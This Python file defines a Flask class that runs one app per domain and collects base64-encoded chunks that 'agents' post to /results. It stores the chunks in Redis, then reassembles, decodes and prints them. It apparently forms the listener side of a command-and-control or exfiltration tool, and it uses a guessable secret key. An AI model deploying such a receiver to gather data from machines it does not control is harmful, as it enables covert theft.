from flask import Flask, render_template, request, jsonify
import base64 
import redis
import os

class FlaskApplication:
    """
    Programmatic Flask application class that creates domain-specific Flask apps
    Each instance handles a specific domain with its own template folder and configuration
    """
    
    def __init__(self, domain):
        self.domain = domain
        self.app = self._create_app()
        self.redis_client = redis.Redis()
        self._setup_routes()
    
    def _create_app(self):
        """Create Flask app instance with domain-specific template folder"""
        template_folder = f"templates/{self.domain}"
        
        # Create template folder if it doesn't exist
        os.makedirs(template_folder, exist_ok=True)
        
        app = Flask(__name__, template_folder=template_folder)

        # Create a basic index.html inside of the folder if it does not exist 
        self._create_index_html()
        
        # Domain-specific configuration
        app.config.update({
            'DOMAIN': self.domain,
            'SECRET_KEY': f'{self.domain}-secret-key',
            'DEBUG': False
        })
        
        return app
    
    def _setup_routes(self):
        """Setup all routes for the Flask application"""
        
        @self.app.route("/", methods=["GET"])
        def home(): 
            return render_template("index.html", domain=self.domain)
        
        @self.app.route("/health", methods=["GET"])
        def health():
            return jsonify({
                "status": "healthy", 
                "domain": self.domain,
                "app": "flask_application"
            })
        
        @self.app.route("/results", methods=["POST"])
        def reportChunk():
            """
            Upon a POST request to /results, processes given chunks of the message, 
            see _send_results() in agent.py to see message format
            """
            data = request.get_json()
            
            # Load in the data from the chunks
            message_id = data.get("message_id")
            agent_id = data.get("agent_id")
            chunk_size = data.get("chunk_size")
            chunk_index = data.get("chunk_index")
            chunk_count = data.get("chunk_count")
            chunk_data = data.get("chunk_data")

            print(f"[{self.domain}] Chunk {chunk_index}/{chunk_count}")
            
            # Store the chunk in the redis buffer with domain-specific key
            # This ensures data isolation between domains
            list_key = f"chunks:{self.domain}:{agent_id}:{message_id}"
            
            # Push the current chunk at the end of the list 
            self.redis_client.rpush(list_key, chunk_data)

            # Set the time to live of each of the keys (in seconds)
            self.redis_client.expire(list_key, 600)
            
            # Check to see if the current chunk_count = chunk_size.
            # Subtract by 1 as the chunk index starts at 0
            if chunk_index == chunk_count - 1: 
                print(f"[{self.domain}] Reassembling message...")
                # We have everything to reassemble so pass in the list key
                result = self._reassemble(list_key)
            
                # Print the outputted result
                print(f"[{self.domain}] Output:")
                print(result)
            
            # Return status required for Flask
            return jsonify(status="ok"), 200
    
    def _reassemble(self, list_key): 
        """
        Function that reassembles chunks that are stored 
        in a redis hash into a full message
        once all chunks have been sent
        """
        parts = self.redis_client.lrange(list_key, 0, -1)
        # Combine all the parts
        message = b"".join(parts)
        return base64.b64decode(message)
    
    def _create_index_html(self): 
        """
        Function that creates a simple index.html page if it does not already exist for an application
        """
        template_folder = f"templates/{self.domain}"
        index_file_path = os.path.join(template_folder, 'index.html')
        
        if not os.path.exists(index_file_path):
            basic_html = f"""
        <html>
            <body>
                <h1>{{{{ domain }}}} - Flask Application</h1>
                <p>This is the domain-specific template for: <strong>{ self.domain }</strong></p>
                <p>Generated automatically for {self.domain}</p>
            </body>
        </html>"""
            with open(index_file_path, 'w') as f:
                f.write(basic_html)

    
    def get_app(self):
        """Return the Flask app instance for use with WSGI servers"""
        return self.app